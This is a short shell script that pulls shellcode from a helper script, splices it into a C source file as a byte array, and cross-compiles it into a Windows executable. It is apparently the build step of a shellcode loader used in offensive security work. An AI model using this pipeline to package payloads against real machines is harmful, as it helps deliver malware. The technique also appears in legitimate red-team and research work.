
shellcode=$(./getshellcode.sh | sed "s/\\x/\`/g")
sed -i "s/^.*char shellcode.*;/unsigned char shellcode[] = $shellcode;/g" main.c
sed -i 's/`/\\x/g' main.c
x86_64-w64-mingw32-gcc main.c